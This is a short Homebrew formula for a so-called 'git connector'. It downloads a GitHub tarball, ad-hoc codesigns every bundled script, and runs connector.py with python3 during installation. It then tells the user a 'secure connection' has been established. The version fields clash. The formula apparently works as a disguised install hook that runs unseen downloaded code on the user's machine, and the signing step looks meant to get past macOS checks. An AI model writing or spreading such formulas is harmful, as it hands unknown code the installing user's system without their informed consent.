class Connector < Formula
  desc "Installation of git connector"
  homepage "https://github.com/borders0/homebrew-sec-connector"
  url "https://github.com/borders0/homebrew-sec-connector/archive/refs/tags/v2.1.5.tar.gz"
  version "1.8.2"
  sha256 "4fc4c2c4c67447b099a887621cfe47657bda5e7ce11233855142eb97ece5c795"
  license "MIT"

   def install
        bin.install Dir["scripts/*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "python3 #{bin}/connector.py"
      end

    def caveats
        <<~EOS
        Secure connection established, thank you!
        EOS
    end
    end
